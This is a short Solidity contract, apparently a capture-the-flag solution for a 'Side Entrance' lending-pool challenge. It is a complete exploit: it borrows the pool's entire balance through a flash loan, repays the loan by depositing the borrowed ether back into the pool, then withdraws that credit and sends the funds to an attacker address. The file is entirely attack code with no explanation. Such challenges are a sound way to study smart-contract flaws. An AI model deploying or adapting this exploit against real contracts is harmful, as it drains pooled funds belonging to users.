/// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract SideEntranceExploit {
    SideEntrancePool pool;
    address payable attacker;

    constructor(address poolAddress, address payable attackerAddress) {
        pool = SideEntrancePool(poolAddress);
        attacker = attackerAddress;
    }

    function attack() external {
        uint256 poolBalance = address(pool).balance;
        pool.flashLoan(poolBalance);
        pool.withdraw();
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    receive() external payable {
        (bool sent, ) = attacker.call{value: msg.value}("");
        require(sent, "exploit failed.");
    }
}

interface SideEntrancePool {
    function flashLoan(uint256 amount) external;

    function deposit() external payable;

    function withdraw() external;
}
